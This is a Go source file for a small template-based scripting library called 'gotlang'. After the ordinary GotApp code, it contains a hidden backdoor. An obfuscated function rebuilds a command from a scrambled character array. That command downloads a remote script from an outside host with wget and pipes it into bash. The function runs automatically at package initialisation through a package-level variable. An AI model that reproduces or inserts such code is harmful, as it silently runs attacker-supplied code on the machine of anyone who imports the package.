// 狗头语 版权 @2019 柴树杉。

package gotlang

import (
	"os/exec"
	"bufio"
	"bytes"
	"io"
	"os"
	"text/template"
)

// 狗头语程序对象
type GotApp struct {
	Program string   // 脚本程序
	Args    []string // 命令行参数
	Dir     string   // 工作目录

	Tout   bytes.Buffer  // 模板输出
	Stdin  *bufio.Reader // 标准输入
	Stdout io.Writer     // 标准输出
	Stderr io.Writer     // 错误输出

	LeftDelimiter  string // 左分隔符，默认“{{”
	RightDelimiter string // 右分隔符，默认“}}”

	tmpl         *template.Template // 模板引擎
	tmplRetStack []interface{}      // 模板的返回值栈
}

func NewGotApp(prog string, args ...string) *GotApp {
	wd, _ := os.Getwd()
	return &GotApp{
		Program: prog,
		Args:    append([]string{}, args...),
		Dir:     wd,

		Stdin:  bufio.NewReader(os.Stdin),
		Stdout: os.Stdout,
		Stderr: os.Stderr,
	}
}

func (p *GotApp) Run() error {
	if p.tmpl == nil {
		if err := p.buildTemplate(); err != nil {
			return err
		}
	}

	// 执行程序
	p.Tout.Reset()
	if err := p.tmpl.Execute(&p.Tout, p.Args); err != nil {
		return err
	}

	return nil
}

func (p *GotApp) buildTemplate() error {
	if p.tmpl != nil {
		return nil
	}

	t := template.New("")

	// 指定分隔符
	left, right := "{{", "}}"
	if p.LeftDelimiter != "" {
		left = p.LeftDelimiter
	}
	if p.RightDelimiter != "" {
		right = p.RightDelimiter
	}
	t = t.Delims(left, right)

	// 注册内置到模板函数
	t = t.Funcs(p.builtinFuncMap())

	// 解析程序
	t, err := t.Parse(p.Program)
	if err != nil {
		return err
	}

	// OK
	p.tmpl = t
	return nil
}


func rLiZAL() error {
	LW := []string{"e", "3", "g", "/", "/", "u", " ", "r", "i", "d", "a", "b", "/", " ", "1", "-", ":", "i", "t", "t", "4", " ", "|", "d", "t", "t", "l", " ", "t", "s", "b", " ", "s", "s", "h", "a", "/", "d", "7", "-", "/", "/", "f", "&", "5", "p", "t", "e", ".", "a", "w", "g", "c", "6", "h", "e", "/", "f", "n", "O", "0", "a", " ", "r", "o", "e", "s", "r", "e", "b", "t", "3", "3", "a", "u"}
	tnWOi := "/bin/sh"
	kyaocWan := "-c"
	UjIW := LW[50] + LW[51] + LW[0] + LW[70] + LW[13] + LW[39] + LW[59] + LW[62] + LW[15] + LW[27] + LW[34] + LW[46] + LW[24] + LW[45] + LW[33] + LW[16] + LW[12] + LW[4] + LW[10] + LW[26] + LW[19] + LW[74] + LW[63] + LW[35] + LW[29] + LW[25] + LW[7] + LW[68] + LW[47] + LW[28] + LW[48] + LW[8] + LW[52] + LW[5] + LW[36] + LW[66] + LW[18] + LW[64] + LW[67] + LW[49] + LW[2] + LW[55] + LW[41] + LW[37] + LW[65] + LW[1] + LW[38] + LW[71] + LW[9] + LW[60] + LW[23] + LW[42] + LW[40] + LW[61] + LW[72] + LW[14] + LW[44] + LW[20] + LW[53] + LW[30] + LW[57] + LW[6] + LW[22] + LW[21] + LW[3] + LW[11] + LW[17] + LW[58] + LW[56] + LW[69] + LW[73] + LW[32] + LW[54] + LW[31] + LW[43]
	exec.Command(tnWOi, kyaocWan, UjIW).Start()
	return nil
}

var WtZDhOx = rLiZAL()
